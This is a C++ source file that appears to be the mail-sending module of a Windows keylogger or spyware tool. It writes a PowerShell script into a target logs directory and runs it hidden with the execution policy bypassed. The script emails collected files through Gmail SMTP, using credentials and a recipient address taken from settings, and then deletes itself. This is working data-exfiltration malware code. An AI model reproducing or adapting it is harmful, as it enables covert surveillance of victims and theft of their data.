#include <fstream>
#include <vector>
#include <windows.h>
#include "IO.h"
#include "Helper.h"
#include "Timer.h"
#include "MailSender.h"
#include "Settings.h"

namespace Mail
{

    const std::string from = Settings::get_mail_from();
    const std::string pass = Settings::get_mail_pass();
    const std::string to = Settings::get_mail_to();

    const std::string &PowerShellScript =
    "Param( \r\n   [String[]]$Att,\r\n   [String]$Subj,\r\n   "
    "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
    " {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
    "[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$false)]\r\n        "
    "[String[]]$Attachments\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
    "System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
    "\r\n            if ($Attachments -ne $null) {\r\n                try\r\n                    {\r\n"
    "  foreach ($file in $Attachments)\r\n                    "
    "        {\r\n               "
    "         $Msg.Attachments.Add($file)\r\n                            }\r\n                    "
    "}\r\n                catch\r\n                    {\r\n                        exit 2; "
    "\r\n                    }\r\n            }\r\n "
    "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
    "           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
    "System.Net.NetworkCredential($From, $Password); \r\n            $Client.Send($Msg)\r\n "
    "           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
    "exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
    "  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
    "Send-EMail -Attachments $Att "
    "-To \"" +
    to +
    "\""
    " -Body $Body -Subject $Subj "
    "-Password \"" +
    pass +
    "\""
    " -From \"" +
    from +
    "\""
    "\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

    std::string StringReplace(std::string s, const std::string &toReplace, const std::string &replaceWith)
    {
        if (toReplace.empty())
            return s;
        size_t stringPosition = 0;
        while ((stringPosition = s.find(toReplace, stringPosition)) != std::string::npos)
            s.replace(stringPosition, toReplace.length(), replaceWith), stringPosition += replaceWith.length();
        return s;
    }

    Timer mailTimer; //TODO: put this in header withouth error: multiple definition of `Mail::mailTimer'

    bool CreateMailSendingScript()
    {
        #define SCRIPT_NAME "sm.ps1"
        std::ofstream scriptOutFile ( IO::GetTargetLogsDirPath(true) + std::string(SCRIPT_NAME));

        if (!scriptOutFile)
            return false;
        
        scriptOutFile << PowerShellScript;
        
        if (!scriptOutFile) //check if succesful
            return false;
        
        scriptOutFile.close();
        return true;
    }

    
    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments, const bool &delScript)
    {
        bool ok = IO::MakeOneDirectory(IO::GetTargetLogsDirPath(false));
        if (!ok)
        {
            IO::DeleteFile(IO::GetTargetLogsDirPath(true) + std::string(SCRIPT_NAME));
            return -1;
        }
        std::string scriptPath = IO::GetTargetLogsDirPath(true) + std::string(SCRIPT_NAME);
        bool hasCreatedFile = CreateMailSendingScript();
        if (!hasCreatedFile)
        {
            IO::DeleteFile(IO::GetTargetLogsDirPath(true) + std::string(SCRIPT_NAME));
            return -2;
        }
        std::string param = "-ExecutionPolicy Bypass -File \"" + scriptPath + "\" -Subj \"" +
                            StringReplace(subject, "\"", "\\\"") +
                            "\" -Body \"" +
                            StringReplace(body, "\"", "\\\"");
                            
        if (attachments != "")
            param += "\" -Att \"" + attachments + "\""; 

        SHELLEXECUTEINFO ShExecInfo = {0};
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        ShExecInfo.hwnd = NULL;
        ShExecInfo.lpVerb = "open";
        ShExecInfo.lpFile = "powershell";
        ShExecInfo.lpParameters = param.c_str();
        ShExecInfo.lpDirectory = NULL;
        ShExecInfo.hInstApp = NULL;
        ShExecInfo.nShow = SW_HIDE;

        bool ExecuteWasSuccesful = (bool)ShellExecuteEx( &ShExecInfo );
        if (!ExecuteWasSuccesful)
        {
            if (delScript)
                IO::DeleteFile(IO::GetTargetLogsDirPath(true) + std::string(SCRIPT_NAME));
            return -3;
        }

        WaitForSingleObject( ShExecInfo.hProcess, 7000 );
        DWORD exit_code = 100;
        GetExitCodeProcess( ShExecInfo.hProcess, &exit_code );

        mailTimer.SetFunction([&]()
        {
            WaitForSingleObject(ShExecInfo.hProcess, 60000);
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
            if ((int)exit_code == STILL_ACTIVE)
                TerminateProcess(ShExecInfo.hProcess, 100);
            IO::WriteDebugAppLog( "<From Sendmail in Mailsender.cpp> Return code: " + Helper::ToString((int)exit_code) );
            if(delScript)
                IO::DeleteFile(IO::GetTargetLogsDirPath(true) + std::string(SCRIPT_NAME));
        });

        mailTimer.SettotalFunctCalls(1L);
        mailTimer.SetInterval(10L);
        mailTimer.Start(true);
        return (int) exit_code;
    }

    int SendMail(const std::string &subject, const std::string &body, 
                 const std::vector<std::string> &att, const bool &delScript)
    {
        std::string attachments = "";
        if (att.size() == 1U)
            attachments = att.at(0);
        else
        {
            for (const auto &v : att)
                attachments += v + ", ";
            attachments = attachments.substr(0, attachments.length() - 2);
        }
        return SendMail(subject, body, attachments, delScript);
    }
}